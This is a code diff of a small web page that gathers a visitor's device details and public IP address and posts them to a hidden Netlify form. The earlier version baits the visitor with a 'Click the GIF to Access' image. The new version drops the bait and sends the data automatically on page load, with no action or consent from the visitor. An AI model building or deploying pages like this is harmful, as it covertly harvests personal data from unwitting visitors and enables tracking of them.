@@ -3,19 +3,18 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Click GIF to Access</title>
+  <title>Device Info Auto Submit</title>
 </head>
 <body>
-  <h1>Click the GIF to Access</h1>
+  <h1>Device Info Collector</h1>
 
-  <!-- Your GIF -->
-  <img id="triggerGif" src="https://i.makeagif.com/media/5-04-2017/Y35b4a.gif" alt="Click to access" style="cursor:pointer; width:300px;">
-
-  <!-- Hidden Netlify form -->
+  <!-- Netlify form -->
   <form name="device-info" netlify netlify-honeypot="bot-field" hidden>
     <input type="hidden" name="form-name" value="device-info">
     <input type="hidden" name="deviceInfo" id="deviceInfo">
   </form>
+
+  <p id="status"></p>
 
 <script>
 async function gatherDeviceInfo() {
@@ -33,7 +32,9 @@ async function gatherDeviceInfo() {
   };
 
   try {
-    const ipv4 = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+    // Get public IPv4 only
+    const ipv4 = await fetch("https://api.ipify.org?format=json")
+      .then(res => res.json());
     info.ip = ipv4.ip || "Unavailable";
   } catch(e) {
     info.ip = "Unavailable";
@@ -42,8 +43,12 @@ async function gatherDeviceInfo() {
   return info;
 }
 
-document.getElementById("triggerGif").addEventListener("click", async () => {
+const statusEl = document.getElementById("status");
+
+window.addEventListener("load", async () => {
   const data = await gatherDeviceInfo();
+
+  // Fill hidden input with JSON string
   document.getElementById("deviceInfo").value = JSON.stringify(data);
 
   // Submit to Netlify
@@ -54,11 +59,11 @@ document.getElementById("triggerGif").addEventListener("click", async () => {
     body: new URLSearchParams(new FormData(form)).toString()
   })
   .then(() => {
-    alert("✅ Info sent successfully.");
+    statusEl.textContent = "✅ Info (including IPv4) sent automatically.";
   })
   .catch(err => {
     console.error(err);
-    alert("❌ Failed to send.");
+    statusEl.textContent = "❌ Failed to send.";
   });
 });
 </script>
